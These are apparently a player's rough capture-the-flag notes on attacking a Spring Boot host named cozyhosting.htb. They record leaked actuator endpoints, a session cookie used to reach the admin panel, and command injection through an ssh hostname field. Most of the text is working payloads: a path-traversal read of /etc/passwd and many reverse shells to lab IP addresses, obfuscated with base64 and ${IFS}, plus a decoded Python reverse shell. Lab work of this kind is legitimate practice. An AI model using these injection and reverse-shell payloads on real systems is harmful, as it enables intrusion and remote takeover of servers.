springboot for backend with java

![[Pasted image 20230904191555.png]]
http://cozyhosting.htb/actuator/env
http://cozyhosting.htb/actuator/beans
http://cozyhosting.htb/actuator/env/spring.datasource.password

|   |   |
|---|---|
|727B2BC3E745B1CDE791174BD7939621|"kanderson"|  

finally entered to the admin dashboard by cookie tempering
![[Pasted image 20230905134210.png]]

http://cozyhosting.htb/admin?error=ssh:%20Could%20not%20resolve%20hostname%20kanderson:%20Temporary%20failure%20in%20name%20resolution


usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file] [-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]] destination [command [argument ...]]

user is =>  K.Anderson

%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.52%2F4444%200%3E%261%0A

;cat%20../../../../../../../../../../etc/passwd;ls   <= this literally worked 


ssh;echo$(echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zOS80NDQ0IDA+JjE=|base64${IFS}-d|bash);@host

sh${IFS}-i>dev/udp/10.10.14.39/4444 0>&1


## payload 
```null
echo${IFS}cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjUyIiw5MDAxKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw==|base64${IFS}-d|bash
```

decoded :   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.195",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'




;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Ny80NDQ0IDA+JjEK"${IFS%??}|${IFS%??}bash64${IFS%??}-d${IFS%??}|${IFS%??}bash;

WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0M055ODBORFEwSURBK0pqRUs=

# ;echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0M055ODBORFEwSURBK0pqRUs=|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h;

echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h

;echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE9USXVNVFk0TGpRekxqYzFMelEwTkRRZ01ENG1NUT09|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h;